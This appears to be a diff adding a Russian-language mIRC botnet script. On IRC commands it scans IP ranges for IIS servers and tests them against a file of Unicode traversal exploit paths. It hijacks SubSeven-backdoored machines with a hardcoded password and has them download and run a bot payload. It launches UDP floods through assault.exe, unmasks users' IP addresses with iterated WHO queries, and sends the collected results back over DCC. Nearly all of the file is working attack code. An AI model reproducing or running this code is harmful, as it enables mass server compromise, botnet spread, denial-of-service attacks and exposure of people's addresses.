@@ -1,0 +1,534 @@
+on *:text:*:*: {
+  if (!uniscan.clear. isin $1) {
+    write -c unicod_ready |     write -c unicod_look
+    .msg $chan 3***  Очистил файл с насканенными IIS серверами и нАйденЫми бАгами!
+    halt 
+  }
+  if (!uniscan.rezult. isin $1) {
+    dcc send $nick unicod_ready
+  }
+  if (!uniscan.stop. isin $1) {
+    set %iniscan.stat.bag off  |     .timeruniscan_start off  |  sockclose uniscan.*  
+    sockclose unibag.* |  .timerunibag.stat off | .timerunibag.break off | .timerunibaggi_work off
+    .msg $chan 3*** ВЫКЛЮЧИЛ СКАНИРОВАНИЕ! At:4 $longip(%uni.oneip) 3Scan was:4 %uniscan.work 3Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+    nick %uniscan.wnick    
+    halt
+  }
+  if (!uniscan.stat. isin $1) {
+    if (%iniscan.stat.bag == off) {
+      .msg $chan 3*** Статус:12вЫклЮчен3 Last Scan:4 %uniscan.work 3Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 9[in file:4 $lines(unicod_ready) 9bugs] 
+      halt 
+    }
+    if (%iniscan.stat.server == on) {     .msg $chan 3*** Статус:12скАнирУю и ищу бАги3 IIS[4 %uniscan.work 3] n0w server:4 $longip(%uni.oneip) 3Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 9[in file:4 $lines(unicod_ready) 9bugs] }
+    if (%iniscan.stat.server == off) {     .msg $chan 3*** Статус: 12ищу бАги 3Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 3Серверов для проверки:4 $lines(unicod_look) 9[in file:4 $lines(unicod_ready) 9bugs] }
+    halt
+  }
+  if (!uniscan. isin $1) {
+    if ($2 == $null) { halt }
+    if ($3 == $null) { halt }
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    if ($lines(unicodbag.txt) == 0) || ($exists(unicodbag.txt) == $false ) {
+      .msg $chan 4*** error!...нету файла с багами!   
+      halt
+    }  
+    set %uniscan.wnick $me 
+    if ($exists(unicod_ready) == $false) write -c unicod_ready
+    if ($exists(unicod_look) == $false) write -c unicod_look
+    if (SU-SR !isin $me) { nick $iif($len($me) <= 8, $me, $left($me,9)) $+ [SU-SR] }
+    .msg $chan 12*** n0w ScanIng&HackIng IIS servers:4 $2 - $3
+    set %uni.oneip $longip($2) | set %uni.twoip $longip($3)  | set %uniscan.work $2 - $3
+    set %uniscan.chan  $chan  |    set %uniscan.found 0 |   set %uniscan.bag 0
+    set %iniscan.stat.server on  |  set %iniscan.stat.bag on | set %unibag.job on
+    .timeruniscan_start 0 1 uniscanstat $2 $3 $chan
+    .timerunibaggi_work 0 10 unibag.start
+  }
+  if (!scanip.stop. isin $1) {
+    if (%scanip.status == off) {     .msg $iif(# == $null,$nick,#) 3В данный момен сканирование IP не производится... | halt }
+    .msg $iif(# == $null,$nick,#) 3 Сканирование порта:4 %ipCountip 3остановлено на IP:4 %s1Countip
+    set %scanip.end on
+    set %scanip.status off
+    nick $remove($me,_SI)
+  }
+  if (!sub.clear. isin $1) {
+    write -c subready.txt
+    .msg $iif(# == $null,$nick,#) 3*** Удалил список взломанных сабов!!
+  }
+  if (!scanip.clear. isin $1) {
+    write -c scanip.txt
+    .msg $iif(# == $null,$nick,#) 3*** Удалил список насканенных сабов!!
+  }
+  if (!scanport.clear. isin $1) {
+    write -c scanport.txt
+    .msg $iif(# == $null,$nick,#) 3*** Удалил список насканненых портов!
+  }
+  if ( !sub.start. isin $1) {
+    if ($2 == $null) { .msg $iif(# == $null,$nick,#) 4*** Ошибка! Не указан порт саба!  |  halt }
+    if (%sub.unmusk == begun) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Я делаю подбор паролей к сабам!!!  | close -m $nick | halt }   
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    if ($lines(scanip.txt) == 0) {  .msg $iif(# == $null,$nick,#) 4*** Ошибка! Нету файла со списком сабов!  |  halt }
+    if ($lines(scanip.txt) == $null) {   .msg $iif(# == $null,$nick,#) 4*** Ошибка! Нету файла со списком сабов!  | halt }
+    nick $me $+ _SUB
+    $iif(# == $null,set %targetip.obj $nick , set %targetip.obj #)
+    sub.take.pass $iif(# == $null,$nick,#) $2   
+    .msg $iif(# == $null,$nick,#) 3*** Начал подбор паролей к сабу! Всего в файле:4 $lines(scanip.txt) 3 сабов!
+  }
+  if (!sub.stop. isin $1) {
+    if (%sub.unmusk == begun) { 
+      set %sub.unmusk off |  .msg $iif(# == $null,$nick,#) 3Ок! Прекращаю подбор паролей к сабу! Взломано: %found.sub |     nick $remove($me,_SUB) | halt  
+    }
+    .msg $iif(# == $null,$nick,#) 3Подбор паролей к сабу не производится... | halt 
+  }
+  if (!scanport.stop. isin $1) {
+    if (%scanport.status == off) {     .msg $iif(# == $null,$nick,#) 3В данный момен сканирование портов не производится... | halt }
+    .msg $iif(# == $null,$nick,#) 3 Сканирование IP:4 %ipCount 3 остановлено на порте:4 %s1Count
+    set %scanport.end on
+    set %scanport.status off
+    nick $remove($me,_SP)
+  }
+  if (!sub.stat. isin $1) {
+    if (%sub.unmusk == begun) { 
+      .msg $iif(# == $null,$nick,#) 3В данный момен подбираю пароль к4 %count.sub 3сабу, всего в файле:4 %count.all.sub 3 сабов! Взломано:4 %found.sub | halt  
+    }
+    .msg $iif(# == $null,$nick,#) 3Подбор паролей к сабу не производится... | halt 
+  }
+  if (!scanip.stat. isin $1) {
+    if (%scanip.status == off) {     .msg $iif(# == $null,$nick,#) 3Cканирование IP не производится...last scan port:4 %ipCountip 3IP: [4 %s11Countip 3-4 %s2Countip 3] | halt }
+    .msg $iif(# == $null,$nick,#) 3В данный момен я сканирую порт: 4  %ipCountip  3 c IP:4 %s1Countip  3до IP:4 %s2Countip
+  }
+  if (!scanport.stat. isin $1) {
+    if (%scanport.status == off) {     .msg $iif(# == $null,$nick,#) 3Cканирование портов не производится...last scan IP:4 %ipCount 3port:4 %s11Count 3-4 %s2Count | halt }
+    .msg $iif(# == $null,$nick,#) 3В данный момен я сканирую[4  %ipCount  3] на порте:4 %s1Count  3до порта:4 %s2Count
+  }
+  if (!sub.rezult. isin $1) {
+    dcc send $nick subready.txt
+  }
+  if (!scanport.rezult. isin $1) {
+    dcc send $nick scanport.txt
+  }
+  if ( !unmask.rezult. isin $1) {
+    dcc send $nick unmaskedip.txt
+  }
+  if ( !scanip.rezult. isin $1) {
+    dcc send $nick scanip.txt
+  }
+  if ($1 == attack) {
+    if ($2 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите IP  | close -m $nick | halt }   
+    if ($3 == $null) { 
+      .msg $iif(# == $null,$nick,#) 3*** YeS Sir! Attack to 12<<4 $2 12 >>
+      .run -n assault.exe -udp $2 -packets 64000 -size 63 -pps 2500 
+    }
+    if ($3 != $null) { 
+      .msg $iif(# == $null,$nick,#) 3*** YeS Sir! Attack to 12<<4 $2 $+ : $+ $3 12 >>
+      .run -n assault.exe -udp $2 -packets 64000 -size 63 -pps 2500 -port $3 
+    }
+  }
+  if (!scanport. isin $1) {
+    if (%scanport.status == on) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Я уже сканирую порты...  | close -m $nick | halt }   
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    if ($2 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите IP  | close -m $nick | halt }   
+    if ($3 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите начальный порт | close -m $nick | halt }   
+    if ($4 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите конечный порт | close -m $nick | halt }   
+    nick $me $+ _SP
+    $iif(# == $null,set %target.obj $nick , set %target.obj #)
+    $iif($5 == $null,set %scan.rezult show , set %scan.rezult hide)
+    set %scanport.status on
+    .msg $iif(# == $null,$nick,#) 3*** Начал сканировать порты c4 $3 3по4 $4 3у:4 $2
+    set %scan.openport 0 |     set %ipCount $2 |     set %s1Count $3 |     set %s11Count $3 |   set %s2Count $4
+    scanstart
+  }
+  if (!scanip. isin $1) { 
+    if (%scanip.status == on) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Я уже сканирую ip...  | close -m $nick | halt }   
+    if (%sub.unmusk == begun) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Я делаю подбор паролей к сабам!!!  | close -m $nick | halt }   
+    if (%iniscan.stat.bag == on) {
+      .msg $chan 3*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 3Found bag:4 %uniscan.bag 
+      halt
+    }
+    if ($2 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите порт  | close -m $nick | halt }   
+    if ($3 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите начальный IP | close -m $nick | halt }   
+    if ($4 == $null) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Укажите конечный IP | close -m $nick | halt }   
+    nick $me $+ _SI
+    $iif(# == $null,set %targetip.obj $nick , set %targetip.obj #)
+    $iif($5 == $null,set %scanip.rezult show , set %scanip.rezult hide)
+    set %sub.unmusk off   |     set %scanip.status on | set %sub.take.ready off
+    if (($2 == 27374) || ($2 == 1243))  { set %sub.unmusk on }  
+    .msg $iif(# == $null,$nick,#) 3*** Начал сканировать порт:4 $2  3у IP: 4 $3 3по IP:4 $4 
+    set %scan.openip 0 |    set %ipCountip $2 |    set %s1Countip $3 |     set %s11Countip $3 |     set %s2Countip $4
+    scanip %s1Countip %ipCountip
+    scanstartip
+  }
+  if ($1 == !unmask) {
+    if (%unmask.status == on) { .timerkick $+ $nick 1 3  .msg $iif(# == $null,$nick,#) 4 Я уже делаю unmask ip...  | close -m $nick | halt }      
+    set %unmask.status on
+    set %Un.IPTake $null
+    set %Un.NickTake $2
+    $iif(# == $null,set %targetun.obj $nick , set %targetun.obj #)
+    .msg $iif(# == $null,$nick,#) 3*** Начал unmask for :4 $2 
+    getmask $2
+  }
+}
+on 1:sockopen:sub.*: {
+  if ($sockerr > 0) {    sockclose $sockname |   return  }
+}
+on *:sockread:sub.*:{ 
+  sockread -f %sub.temp 
+  if (connect isin %sub.temp)  { 
+    inc %found.sub
+    write subready.txt Ready at: $sock($sockname).ip $sock($sockname).port
+    msg %targetip.obj 4*** Found&Hacked sub!!! >> $sock($sockname).ip $sock($sockname).port 12[d0wnl0ad b0t kn0w] 
+    sockwrite $sockname UFU $+ %url
+  } 
+  if (failed to download file isin %sub.temp) {
+    msg %targetip.obj 4*** I can't download b0t(try do it)..at:  $sock($sockname).ip $sock($sockname).port 
+    sockclose $sockname      
+  }
+  if (downloaded isin %sub.temp) { 
+    run c:\ct.exe 
+    msg %targetip.obj 4*** b0t ready to start(downloaded) at:  $sock($sockname).ip $sock($sockname).port 
+    sockclose $sockname      
+  }
+  if (%sub.temp == PWD) {  sockwrite $sockname PWD14438136782715101980  }
+  if (incorrect password isin %sub.temp) { sockclose $sockname }
+}
+alias sub.sock  {
+  inc %count.sub
+  if (%count.sub > %count.all.sub) { msg $3 4*** Подбор паролей к сабу завершен! Взломано:12 %found.sub   | set %sub.unmusk off  | .timernewnick 1 2 nick $remove($me,_SUB) | halt }
+  set %sub.who $read -l $+ %count.sub scanip.txt 
+  sockopen sub. $+ %count.sub $gettok(%sub.who,10,32) $2
+  .timersubstart 1 10  sub.sock %count.sub $2 $3
+  .timersub.close $+ %count.sub 1 60 sockclose sub. [ $+ [ %count.sub ] ] 
+}
+alias sub.take.pass {
+  set %sub.unmusk  begun | set %found.sub 0
+  if ($lines(scanip.txt) == $null) {   nick $remove($me,_SI) | set %sub.unmusk off  | msg $1 4*** Взламывать нечего! Файл сабов пустой!  | halt }
+  if ($lines(scanip.txt) == 0) {  nick $remove($me,_SI) | set %sub.unmusk off | msg $1 4*** Взламывать нечего! Файл сабов пустой!  | halt }
+  nick $remove($me,_SI) $+ _SUB 
+  .msg $1 4*** Начинаю подбор паролей! Аллилуя!!! (всего: $lines(scanip.txt) сабов)
+  set %count.sub 0 | set %count.all.sub $lines(scanip.txt)
+  sub.sock %count.sub $2 $1
+}
+alias scanstart {
+  if (%scanport.end == on) {     set %scanport.status off | set %scanport.end off |  halt } 
+  if (%s1Count > %s2Count) { 
+    .msg %target.obj 3*** Закончил сканировать порты у:4 %ipCount 3Open ports:4 %scan.openport
+    nick $remove($me,_SP)
+    sockclose scanport.*
+    set %scanport.status off |  halt 
+  }
+  scanport %ipCount %s1Count
+  inc %s1Count
+  .timerscan -mo 1 40 scanstart2
+}
+alias scanstart2 {
+  if (%scanport.end == on) {     set %scanport.status off | set %scanport.end off |  halt } 
+  if (%s1Count > %s2Count) { 
+    .msg %target.obj 3*** Закончил сканировать порты у:4 %ipCount 3Open ports:4 %scan.openport
+    nick $remove($me,_SP)
+    sockclose scanport.*
+    set %scanport.status off |  halt 
+  }
+  scanport %ipCount %s1Count
+  inc %s1Count
+  .timerscan -mo 1 40 scanstart
+}
+alias scanport {
+  sockclose scanport. $+ $1 $+ . $+ $2 
+  sockopen scanport. $+ $1 $+ . $+ $2 $1 $2
+}
+on 1:sockopen:scanport.*: {
+  if ($sockerr > 0) { sockclose $sockname |  return }
+  if (%scan.rezult == hide) {
+    write scanport.txt Scanport process[ %ipCount  ] : open port at: $gettok($sockname,6,46) 
+    inc %scan.openport
+    sockclose $sockname
+    halt
+  }
+  .timersockopip $+ $gettok($sockname,6,46) 1 4  .msg %target.obj 12Scanport process[4  %ipCount  12] : open port at:4 $gettok($sockname,6,46) 
+  write scanport.txt Scanport process[ %ipCount  ] : open port at: $gettok($sockname,6,46) 
+  inc %scan.openport
+  sockclose $sockname
+}
+alias scanstartip {
+  if (%scanip.end == on) {     set %scanip.status off | set %scanip.end off |  halt } 
+  if (%s1Countip == %s2Countip) { 
+    .msg %targetip.obj 3*** Закончил сканировать порт: 4  %ipCountip  3 c IP:4 %s11Countip  3до IP:4 %s2Countip $+ 3. are found: [ 4 %scan.openip  3] 
+    sockclose scanip.*
+    set %scanip.status off 
+    if (%sub.unmusk == on ) {  sub.take.pass %targetip.obj %ipCountip | halt }
+    nick $remove($me,_SI)
+    halt 
+  }
+  if ( ($gettok(%s1Countip,4,46) == 255) && ($gettok(%s1Countip,3,46) == 255) ) { set %s1Countip $gettok(%s1Countip,1,46) $+ . $+ $calc($gettok(%s1Countip,2,46) + 1) $+ . $+ 1 $+ . $+ 0 }
+  if ($gettok(%s1Countip,4,46) == 255) { set %s1Countip $gettok(%s1Countip,1-2,46) $+ . $+ $calc($gettok(%s1Countip,3,46) + 1) $+ . $+ 0 }
+  set %s1Countip $gettok(%s1Countip,1-3,46) $+ . $+ $calc($gettok(%s1Countip,4,46) + 1)
+  scanip %s1Countip %ipCountip
+  .timerscan -mo 1 50 scanstartip2
+}
+alias scanstartip2 {
+  if (%scanip.end == on) {     set %scanip.status off | set %scanip.end off |  halt } 
+  if (%s1Countip == %s2Countip) { 
+    .msg %targetip.obj 3*** Закончил сканировать порт: 4  %ipCountip  3 c IP:4 %s11Countip  3до IP:4 %s2Countip $+ 3. are found: [ 4 %scan.openip  3] 
+    sockclose scanip.*
+    set %scanip.status off 
+    if (%sub.unmusk == on ) {  sub.take.pass %targetip.obj %ipCountip | halt }
+    nick $remove($me,_SI)
+    halt 
+  }
+  if ( ($gettok(%s1Countip,4,46) == 255) && ($gettok(%s1Countip,3,46) == 255) ) { set %s1Countip $gettok(%s1Countip,1,46) $+ . $+ $calc($gettok(%s1Countip,2,46) + 1) $+ . $+ 1 $+ . $+ 0 }
+  if ($gettok(%s1Countip,4,46) == 255) { set %s1Countip $gettok(%s1Countip,1-2,46) $+ . $+ $calc($gettok(%s1Countip,3,46) + 1) $+ . $+ 0 }
+  set %s1Countip $gettok(%s1Countip,1-3,46) $+ . $+ $calc($gettok(%s1Countip,4,46) + 1)
+  scanip %s1Countip %ipCountip
+  .timerscan -mo 1 50 scanstartip
+}
+alias scanip {
+  sockclose scanip. $+ $1 $+ . $+ $2 
+  sockopen scanip. $+ $1 $+ . $+ $2 $1 $2
+}
+on 1:sockopen:scanip.*: {
+  if ($sockerr > 0) { sockclose $sockname |  return }
+  if (%scanip.rezult == hide) {
+    write scanip.txt Scanip process port[ %ipCountip  ] : open at IP: $gettok($sockname,2-5,46)
+    inc %scan.openip 
+    sockclose $sockname
+    halt
+  }
+  .timersockoppt $+ $gettok($sockname,2-5,46) 1 4 .msg %targetip.obj 12Scanip process port[4  %ipCountip  12] : open at IP:4 $gettok($sockname,2-5,46) 
+  write scanip.txt Scanip process port[ %ipCountip  ] : open at IP: $gettok($sockname,2-5,46) 
+  inc %scan.openip
+  sockclose $sockname
+}
+alias getmask  { .enable #whogetmask | .who %Un.NickTake  }
+#whogetmask off
+raw 352:*: haltdef |  set %Un.IPTake $4  | halt
+raw 315:*: {
+  haltdef | .disable #whogetmask 
+  if (%Un.IPTake != $null) { unmasking }
+  if (%Un.IPTake == $null) {    .msg %targetun.obj 4 Ошибка! Данного ника 12[ $2 ]4 нет на сервере!  }
+}
+#whogetmask end
+
+alias unmasking {
+  set %un.found.one on
+  set %un.i 1
+  set %un.foundsome $null
+  $iif($remove(%Un.IPTake,1,2,3,4,5,6,7,8,9,0,.) == $null, unmask.meth2 , unmask.meth1   )      
+}
+alias unmask.meth1 {
+  set %un.all .1234567890-abcdefghijklmnopqrstuvwxyz
+  set %un.needIP $right(%Un.IpTake,$calc($len(%Un.IpTake) - $len($gettok(%Un.IpTake,1,46)))) 
+  .enable #scandomen
+  .raw who * $+ $mid(%un.all,%un.i,1) $+ * $+ %un.needIP
+}
+alias unmask.meth2 {
+  set %un.all 1234567890
+  set %un.Step 1
+  .enable #scanhost
+  set %un.needIP $gettok(%Un.IPTake,1-3,46) $+ . 
+  .raw who %un.needIP $+ $mid(%un.all,%un.i,1) $+ *
+}
+#scandomen2 off
+raw 352:*: { 
+  haltdef
+  if ($6 == %Un.NickTake) {
+    set %un.found.one yes
+    halt  
+  }
+}
+raw 315:*: { 
+  haltdef
+  if (%un.Step == 1) {
+    if (%un.found.one == yes) {
+      set %un.Step 2
+      set %un.found.one on
+      .raw who $mid(%un.foundsome,%un.i,1) $+ %un.needIP
+      halt
+    }
+    if ( $mid(%un.foundsome,%un.i,1) ==  $right(%un.foundsome,1) ) {
+      .msg %targetun.obj 4       Ошибка....ничего не найдено.....:(
+      set %unmask.status off
+      .disable #scandomen2
+      halt
+    }
+    inc %un.i
+    .raw who * $+  $mid(%un.foundsome,%un.i,1)  $+  %un.needIP
+  }
+  if (%un.Step == 2) {
+    if (%un.found.one == yes) {
+      set %un.found.one on
+      set %un.needIP $mid(%un.foundsome,%un.i,1) $+ %un.needIP
+      write -il1 $mircdir\unmaskedip.txt %Un.NickTake :  %un.needIP 
+      .dns %un.needIP
+      set %unmask.status off
+      .disable #scandomen2
+      halt 
+    }
+    set %un.Step 1
+    set %un.needIP $mid(%un.foundsome,%un.i,1) $+ %un.needIP
+    set %un.foundsome $remove(%un.foundsome,$mid(%un.foundsome,%un.i,1)) $+ $mid(%un.foundsome,%un.i,1)
+    set %un.i 1
+    .raw who * $+  $mid(%un.foundsome,%un.i,1)  $+  %un.needIP
+  }
+}
+#scandomen2 end
+#scandomen off
+raw 352:*: { 
+  haltdef
+  if ($6 == %Un.NickTake) {
+    set %un.found.one yes
+    halt  
+  }
+}
+raw 315:*: { 
+  haltdef
+  if ($mid(%un.all,%un.i,1) == z) {
+    if (%un.foundsome == $null) { 
+      .msg %targetun.obj 4 Ошибка.....ничего не найдено.....:(
+      set %unmask.status off
+      .disable #scandomen
+      halt
+    }
+    .msg %targetun.obj 3*** Закончил поиск символов[4 %un.foundsome 3] Начинаю размещать...
+    set %un.i 1
+    set %un.Step 1
+    .disable #scandomen
+    .enable #scandomen2
+    .raw who * $+  $mid(%un.foundsome,%un.i,1)  $+  %un.needIP
+    halt
+  }
+  if (%un.found.one == yes) {
+    set %un.found.one on
+    set %un.foundsome %un.foundsome $+ $mid(%un.all,%un.i,1)
+    inc %un.i
+    .raw who * $+  $mid(%un.all,%un.i,1) $+ * $+  %un.needIP
+    halt
+  }
+  inc %un.i
+  .raw who * $+ $mid(%un.all,%un.i,1) $+ * $+ %un.needIP
+}
+#scandomen end
+#scanhost off
+raw 352:*: { 
+  haltdef
+  if ($6 == %Un.NickTake) {
+    set %un.found.one yes
+    halt  
+  }
+}
+raw 315:*: { 
+  haltdef
+  if (%un.Step == 1) {
+    if (%un.found.one == yes) {
+      set %un.Step 2
+      set %un.found.one on
+      .raw who %un.needIP $+ $mid(%un.all,%un.i,1)
+      halt
+    }
+    if ( $mid(%un.all,%un.i,1) ==  $right(%un.all,1) ) {
+      .msg %targetun.obj 4 Ошибка.....ничего не найдено.....:(
+      set %unmask.status off
+      .disable #scanhost
+      halt
+    }
+    inc %un.i
+    .raw who %un.needIP $+ $mid(%un.all,%un.i,1) $+ *
+  }
+  if (%un.Step == 2) {
+    if (%un.found.one == yes) {
+      set %un.found.one on
+      set %un.needIP %un.needIP $+ $mid(%un.all,%un.i,1)
+      write -il1 $mircdir\unmaskedip.txt %Un.NickTake :  %un.needIP
+      .msg %targetun.obj 3*** IP для [4 %un.nicktake 3] найден:4 %un.needIP 
+      set %unmask.status off
+      .disable #scanhost
+      halt 
+    }
+    set %un.Step 1
+    set %un.needIP %un.needIP $+ $mid(%un.all,%un.i,1)
+    set %un.i 1
+    .raw who %un.needIP  $+ $mid(%un.all,%un.i,1) $+ * 
+  }
+}
+#scanhost end
+on 1:DNS: {
+  if ($raddress == $null) {  .msg %targetun.obj 3*** IP для [4 %un.nicktake 3] найден:4 %un.needIP  }
+  if ($raddress != $null) {  .msg %targetun.obj 3*** IP для [4 %un.nicktake 3] найден:4 %un.needIP $+ ( $+ $raddress $+ )  }
+}
+alias uniscanstat {
+  if ($sock(uniscan.*,0) < 50) {   
+    :start
+    if (%uni.oneip > %uni.twoip) {     .timeruniscan_start off  | set %iniscan.stat.server off |    sockclose uniscan.*  |       halt        }
+    .sockopen uniscan. $+ %uni.oneip $longip(%uni.oneip) 80
+    inc  %uni.oneip
+    .timeruniscan_stop $+ %uni.oneip 1 10 sockclose uniscan. $+ %uni.oneip
+    if ($sock(uniscan.*,0) < 50) { goto start }
+  }
+}
+on *:sockopen:uniscan.*: {
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockwrite -n $sockname HEAD / HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockread:uniscan.*: {
+  .sockread -f %subsock
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  if (Server: Microsoft-IIS isin %subsock) {  write unicod_look $sock($sockname).ip |  inc %uniscan.found |    sockclose $sockname    }
+}
+on *:sockopen:unibag.*: {
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  .sockmark $sockname $read -l $gettok($sock($sockname),2,46) unicodbag.txt
+  .sockwrite -n $sockname GET $sock($sockname).mark HTTP/1.0
+  .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+  .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+  .sockwrite -n $sockname Host: $ip
+  .sockwrite -n $sockname
+}
+on *:sockread:unibag.*: {
+  .sockread -f %subsock
+  if ($sockerr > 0) { sockclose $sockname     | return  }
+  if (Directory of c:\ isin %subsock) {
+    inc %uniscan.bag  |    .msg %uniscan.chan 12Found IIS bAg! 3(4 $sock($sockname).ip $+ $sock($sockname).mark 3) 
+    write unicod_ready $sock($sockname).ip $+ $sock($sockname).mark
+    if ($script(aftp.drv) != $null) && (%aftp.server != $null) && (%aftp.login != $null) && (%aftp.pass != $null) {  .timeraftp 1 3 aftp.start  $sock($sockname).ip $+ $sock($sockname).mark  }
+    .timerunibag.break off | .timerunibag.stat off
+    sockclose unibag.*  |    set %unibag.job on | unibag.start
+  }
+}
+alias unibag.start {
+  if (%unibag.job == on) {
+    if ( (%iniscan.stat.server == off) && ($lines(unicod_look) == 0) ) { 
+      set %iniscan.stat.bag off  |    .timerunibaggi_work off
+      .msg %uniscan.chan 12 *** Закончил сканировать IIS:4  %uniscan.work 12Нашел IIS серверов:4 %uniscan.found 12Взломал IIS'ок:4 %uniscan.bag
+      nick %uniscan.wnick
+      halt
+    }
+    if ($lines(unicod_look) == 0) { halt }
+    set %unibag.job off |  set %uni.bcheck $read -l1 unicod_look |     write -dl1 unicod_look |   set %unibag.page 0
+    .timerunibag.stat 0 1 unibag.stat %uni.bcheck
+    .timerunibag.break 1 60 unibag.break
+  }
+}
+alias unibag.break {  .timerunibag.stat off |  sockclose unibag.*  |    set %unibag.job on | unibag.start }
+alias unibag.stat {
+  if ($sock(unibag.*,0) < 50) {   
+    :start
+    inc %unibag.page 
+    if ($read -l $+ %unibag.page unicodbag.txt == $null) {  .timerunibag.break off | .timerunibag.stat off |  sockclose unibag.*  |    set %unibag.job on | unibag.start | halt    }
+    .sockopen unibag. $+ %unibag.page $1 80 
+    if ($sock(unibag.*,0) < 50) { goto start }
+  }
+}
+on *:DISCONNECT: { 
+  set %scanport.status off |   set %unmask.status off |   set %sub.unmusk off |   set %scanip.status off |   set %iniscan.stat.bag off
+  if (SU-SR isin $me) { nick %uniscan.wnick }
+}
